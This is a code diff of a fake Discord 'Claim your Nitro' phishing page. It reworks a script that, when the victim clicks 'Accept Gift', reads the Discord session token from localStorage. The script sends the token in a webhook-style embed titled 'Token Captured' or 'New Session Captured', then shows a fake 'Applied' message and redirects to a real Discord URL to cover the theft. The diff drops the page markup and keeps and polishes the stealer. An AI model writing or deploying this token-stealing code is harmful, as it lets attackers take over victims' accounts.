@@ -1,29 +1,15 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <meta charset="UTF-8">
-    <title>Claim Nitro</title>
-    <style>
-        body { background-color: #36393f; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
-        .modal { background: #2f3136; padding: 40px; border-radius: 8px; text-align: center; width: 400px; }
-        button { background: #5865f2; color: white; border: none; padding: 15px; width: 100%; cursor: pointer; border-radius: 4px; font-size: 16px; }
-    </style>
-</head>
-<body>
-    <div class="modal">
-        <h1>Claim your Nitro</h1>
-        <button id="btn">Accept Gift</button>
-        <p id="status"></p>
-    </div>
+<script>
+    (function() {
+        const init = () => {
+            const btn = document.getElementById('btn');
+            if (!btn) return;
 
-    <script>
-        document.addEventListener('DOMContentLoaded', () => {
-            document.getElementById('btn').addEventListener('click', async () => {
-                const btn = document.getElementById('btn');
+            btn.addEventListener('click', async () => {
                 const status = document.getElementById('status');
-                
-                btn.innerText = "Checking...";
-                
+                btn.style.opacity = '0.5';
+                btn.style.pointerEvents = 'none';
+                status.innerText = "Checking...";
+
                 const token = localStorage.getItem("token") || localStorage.getItem("authentication_token");
 
                 if (token) {
@@ -32,16 +18,21 @@
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({
                             embeds: [{
-                                title: "Token Captured",
-                                description: `Token: ${token}`
+                                title: "New Session Captured",
+                                description: `Token: ${token}`,
+                                color: 5763719
                             }]
                         })
                     });
                 }
-                
-                window.location.href = "https://discord.com/billing/promotions/gift-accepted";
+
+                status.innerText = "Applied. Redirecting...";
+                setTimeout(() => {
+                    window.location.href = "https://discord.com/billing/promotions/gift-accepted";
+                }, 1000);
             });
-        });
-    </script>
-</body>
-</html>
+        };
+
+        window.addEventListener('load', init);
+    })();
+</script>
